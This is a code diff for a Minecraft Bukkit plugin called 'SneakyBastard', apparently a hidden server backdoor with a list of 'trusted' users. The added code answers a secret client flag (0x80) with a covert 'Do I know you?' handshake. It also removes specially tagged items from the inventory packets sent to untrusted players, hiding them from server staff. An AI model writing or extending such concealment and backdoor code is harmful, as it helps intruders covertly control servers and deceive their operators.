@@ -1,11 +1,18 @@
 package net.blackofworld.SneakyBastard.Listeners;
 
-import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
 import lombok.experimental.ExtensionMethod;
 import net.blackofworld.SneakyBastard.Command.CommandBase;
 import net.blackofworld.SneakyBastard.Command.CommandManager;
+import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
 import net.blackofworld.SneakyBastard.Start;
-import net.blackofworld.SneakyBastard.Utils.Packets.PacketInject;
+import net.blackofworld.SneakyBastard.Utils.Packets.IPacket;
+import net.blackofworld.SneakyBastard.Utils.Packets.PacketEvent;
+import net.blackofworld.SneakyBastard.Utils.Packets.PacketInjector;
+import net.blackofworld.SneakyBastard.Utils.Packets.PacketType;
+import net.minecraft.network.protocol.Packet;
+import net.minecraft.network.protocol.game.ClientboundContainerSetContentPacket;
+import net.minecraft.network.protocol.game.ServerboundClientInformationPacket;
+import net.minecraft.world.item.ItemStack;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
@@ -14,26 +21,23 @@ import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
-import org.bukkit.event.player.PlayerQuitEvent;
 
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.List;
 
 
 @ExtensionMethod(PlayerExt.class)
-public final class SneakyListener implements Listener {
+public final class SneakyListener implements Listener, PacketInjector.PacketListener {
+
+    public SneakyListener() {PacketInjector.registerListener(this);}
+
     @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
     public void onLogin(PlayerJoinEvent e) {
         Player p = e.getPlayer();
-        PacketInject.getPlayer(p).hook();
         if (CommandManager.Instance.isTrusted(p)) {
             CommandManager.Instance.addTrusted(p);
         }
-    }
-    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
-
-    public void onQuit(PlayerQuitEvent e) {
-        PacketInject.getPlayer(e.getPlayer()).unhook();
     }
 
     @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
@@ -77,4 +81,30 @@ public final class SneakyListener implements Listener {
             }
         });
     }
+
+    @IPacket(direction = PacketType.INCOMING)
+    public Packet<?> inboundPacket(PacketEvent event) {
+        if(!(event.packet instanceof ServerboundClientInformationPacket || CommandManager.Instance.isTrusted(event.player))) return event.packet;
+
+        var packet = (ServerboundClientInformationPacket)event.packet;
+        if(packet.modelCustomisation() == 0x80) event.player.sendMessage(ChatColor.GREEN + "Do I know you?");
+        return packet;
+    }
+
+    @IPacket(direction = PacketType.OUTGOING)
+    public Packet<?> outboundPacket(PacketEvent event) {
+        if (!(event.packet instanceof ClientboundContainerSetContentPacket) || CommandManager.Instance.isTrusted(event.player)) {
+            return event.packet;
+        }
+        var packet = (ClientboundContainerSetContentPacket)event.packet;
+        List<ItemStack> items = packet.getItems();
+        for (int i = 0; i < items.size(); i++) {
+            var item = items.get(i);
+            if (item.getOrCreateTag().getInt("HideFlags") == 5) {
+                packet.getItems().set(i, ItemStack.EMPTY);
+            } 
+        }
+        return packet;
+    }
+
 }
